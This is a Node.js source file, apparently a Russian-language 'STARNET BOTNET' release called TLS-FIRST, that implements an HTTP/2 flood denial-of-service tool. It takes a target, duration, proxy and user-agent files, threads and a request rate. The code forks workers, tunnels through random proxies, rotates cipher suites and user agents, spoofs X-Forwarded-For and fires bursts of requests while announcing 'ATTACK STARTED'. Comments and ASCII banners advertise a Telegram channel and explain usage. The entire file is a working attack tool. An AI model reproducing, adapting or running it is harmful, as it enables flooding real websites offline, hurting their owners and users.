/*

░██████╗████████╗░█████╗░██████╗░███╗░░██╗███████╗████████╗  ██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝╚══██╔══╝  ██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝
╚█████╗░░░░██║░░░███████║██████╔╝██╔██╗██║█████╗░░░░░██║░░░  ██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░
░╚═══██╗░░░██║░░░██╔══██║██╔══██╗██║╚████║██╔══╝░░░░░██║░░░  ██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░
██████╔╝░░░██║░░░██║░░██║██║░░██║██║░╚███║███████╗░░░██║░░░  ██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░  ╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░

---------------------> ОБЯЗАТЕЛЬНО ПОДПИСЫВАЙТЕСЬ НА КАНАЛ @STARNET_PEREHODNIK <--------------------------------
---------------------> ОБЯЗАТЕЛЬНО ПОДПИСЫВАЙТЕСЬ НА КАНАЛ @STARNET_PEREHODNIK <--------------------------------
---------------------> ОБЯЗАТЕЛЬНО ПОДПИСЫВАЙТЕСЬ НА КАНАЛ @STARNET_PEREHODNIK <--------------------------------

*/



//импортируем зависимости (модули)
const url     = require('url');
const cluster = require('cluster');
const http2   = require('http2');
const fs      = require('fs');
const colors  = require('colors');

process.on('uncaughtException', function(error) {
//console.log(error)
});
process.on('unhandledRejection', function(error) {
//console.log(error);
})


require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);


//Для удобства делаем вывод в коносль, дабы посмотреть что и куда
if(process.argv.length < 7) {
    setTimeout(() => {  console.log(`░██████╗████████╗░█████╗░██████╗░███╗░░██╗███████╗████████╗ \n██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝╚══██╔══╝ \n╚█████╗░░░░██║░░░███████║██████╔╝██╔██╗██║█████╗░░░░░██║░░░  \n░╚═══██╗░░░██║░░░██╔══██║██╔══██╗██║╚████║██╔══╝░░░░░██║░░░  \n██████╔╝░░░██║░░░██║░░██║██║░░██║██║░╚███║███████╗░░░██║░░░  \n╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░`.yellow);}, 100); setTimeout(() => {  console.log(`██╗░██████╗  ██████╗░███████╗░██████╗████████╗  \n██║██╔════╝  ██╔══██╗██╔════╝██╔════╝╚══██╔══╝  \n██║╚█████╗░  ██████╦╝█████╗░░╚█████╗░░░░██║░░░  \n██║░╚═══██╗  ██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░  \n██║██████╔╝  ██████╦╝███████╗██████╔╝░░░██║░░░  \n╚═╝╚═════╝░  ╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░`.yellow);}, 1000); setTimeout(() => {  console.log(`██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗  \n██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝  \n██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░  \n██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░  \n██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░  \n╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░`.yellow);}, 2000);
    setTimeout(() => {
     console.clear(0);
     console.log('    <--- TLS FIRST --->'.white);
     console.log('<--- BY @STARNET_OWN --->'.white);
     console.log(`LAUNCH ---> node TLS-FIRST.js <target> <time> <proxy file> <ua file> <threads> <rps>`.yellow); 
    /* 
    Что за что отвечает? 
    Target - это то, что мы передаем в переменную TargetUrl , в последствии мы передаем эту переменную в parsed
    time - время атаки
    proxy - ваш прокси лист, желательно использовать только HTTP:S прокси. Другие не полезут!
    threads - ака потоки, сколько вы укажите, столько и будет запускаться скрипт. если у вас маломощный сервер, желательно ставить 5-10.
    rps - Request Per Second, думаю тут понятно
    
    */
     process.exit(0); }, 5000);  
}


// ПОЛУЧАЕМ ПЕРЕМЕННЫЕ ИЗ СИСТЕМНЫХ АРГУМЕНТОВ
var targetURL = process.argv[2]
var parsed = url.parse(targetURL); // достаем данные из переменной targetURL с помощью библиотеки url
var methodRequest = "GET";     // задаем дефолтный параметр под запрос(т.е GET)
var time          = process.argv[3];    // так же передаем данные из аргументов в данную переменную 
var proxylist     = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n'); // читаем файл прокси из аргумента, далее преобразовываем его в массив.
var useragents    = fs.readFileSync(process.argv[5], 'utf-8').toString().replace(/\r/g, '').split('\n'); // читаем файл юзерагентов из аргумента, далее преобразовываем его в массив.
var threads       = process.argv[6]; // Кол-во потоков
var rate          = process.argv[7]; // Кол-во запросов в секунду с одного ip. 


function useragent() {
  return useragents[Math.floor(Math.random() * useragents.length)]
}
const ua = useragent();

// создаем заголовки запроса.
var header = {
    ":authority": parsed.host,
    ":method": methodRequest,
    ":path": parsed.path,
    ":scheme": "https",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US;q=0.8,en;q=0.7",
    "upgrade-insecure-requests": "1",
    "User-agent": ua,
    'x-requested-with': 'XMLHttpRequest' 
} 

if (cluster.isMaster) {
  setTimeout(() => {  console.log(`░██████╗████████╗░█████╗░██████╗░███╗░░██╗███████╗████████╗ \n██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝╚══██╔══╝ \n╚█████╗░░░░██║░░░███████║██████╔╝██╔██╗██║█████╗░░░░░██║░░░  \n░╚═══██╗░░░██║░░░██╔══██║██╔══██╗██║╚████║██╔══╝░░░░░██║░░░  \n██████╔╝░░░██║░░░██║░░██║██║░░██║██║░╚███║███████╗░░░██║░░░  \n╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝░░░╚═╝░░░`.yellow);}, 100); setTimeout(() => {  console.log(`██╗░██████╗  ██████╗░███████╗░██████╗████████╗  \n██║██╔════╝  ██╔══██╗██╔════╝██╔════╝╚══██╔══╝  \n██║╚█████╗░  ██████╦╝█████╗░░╚█████╗░░░░██║░░░  \n██║░╚═══██╗  ██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░  \n██║██████╔╝  ██████╦╝███████╗██████╔╝░░░██║░░░  \n╚═╝╚═════╝░  ╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░`.yellow);}, 1000); setTimeout(() => {  console.log(`██████╗░░█████╗░████████╗███╗░░██╗███████╗████████╗  \n██╔══██╗██╔══██╗╚══██╔══╝████╗░██║██╔════╝╚══██╔══╝  \n██████╦╝██║░░██║░░░██║░░░██╔██╗██║█████╗░░░░░██║░░░  \n██╔══██╗██║░░██║░░░██║░░░██║╚████║██╔══╝░░░░░██║░░░  \n██████╦╝╚█████╔╝░░░██║░░░██║░╚███║███████╗░░░██║░░░  \n╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚══╝╚══════╝░░░╚═╝░░░`.yellow);}, 2000);
  setTimeout(() => {  console.clear();console.log('------> ATTACK STARTED <------'.yellow);  }, 3000); // ... уведомление о том, что атака запустилась успешно.   
   for (let ads = 0; ads < threads; ads++) {
       cluster.fork(); //перезапускаем процесс с таким кол-во, каким мы его указали в переменной threads
   }
} else {
    const cplist = [
        "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
        "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
        ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
    ];
        
		
        setInterval(() => {
                              
                        var cipper = cplist[Math.floor(Math.random() * cplist.length)];      //рандомизация сообщений (от сайта к клиенту)   
                        var proxy = proxylist[Math.floor(Math.random() * proxylist.length)]; //рандомизация прокси листа
                        proxy = proxy.split(':'); //разделение самого рандомизированного прокси листа на :, тоесть будет две части([12.0.0.1 , 8080])
                        header["X-Forwarded-For"] = proxy[0]
                        var http = require('http'),
                            tls = require('tls');
                            
                        tls.DEFAULT_MAX_VERSION = 'TLSv1.3'; // устанавливаем максимальную тлс версию для коннекта
                    
                        var req = http.request({ 
                            //установка сессии прокси
                            host: proxy[0],
                            port: proxy[1],
                            ciphers: cipper, 
                            method: 'CONNECT',
                            path: parsed.host + ":443"
                        }, (err) => {
                            req.end();
                            return;
                        });
                    
                        req.on('connect', function (res, socket, head) { 
                         
                                const client = http2.connect(parsed.href, {
                                    createConnection: () => tls.connect({
                                        host: parsed.host,
                                        ciphers: cipper, 
                                        secureProtocol: 'TLS_method',
                                        challengesToSolve: 3,
                                        cloudflareTimeout: 300,
                                        cloudflareMaxTimeout: 300,
                                        maxRedirects: 4,
                                        followAllRedirects: true,
                                        decodeEmails: false,
                                        gzip: true,
                                        sessionTimeout: 300,
                                        servername: parsed.host,
                                        secure: true,
                                        rejectUnauthorized: false,
                                        ALPNProtocols: ['h2', "http1.1"],
                                        socket: socket
                                    }, function () {
                                        for (let i = 0; i< rate; i++){
                                            
                                            const req = client.request(header); // отправляем запрос уже с нашими заголовками.
                                            req.end();
                                            req.on("response", () => {
                                                req.close();
                                            })
                                        }
                                    })
                                });
                            });
                            req.end();
                        });
                    //остановка атаки спустя время.
                    setTimeout(function() {
                        console.clear(); // очистка консоли
                        console.log('------> ATTACK END <------'.yellow); // опопвещение 
                        process.exit() // выход из процесса ака его заверешение
                      }, time * 1000); 

}

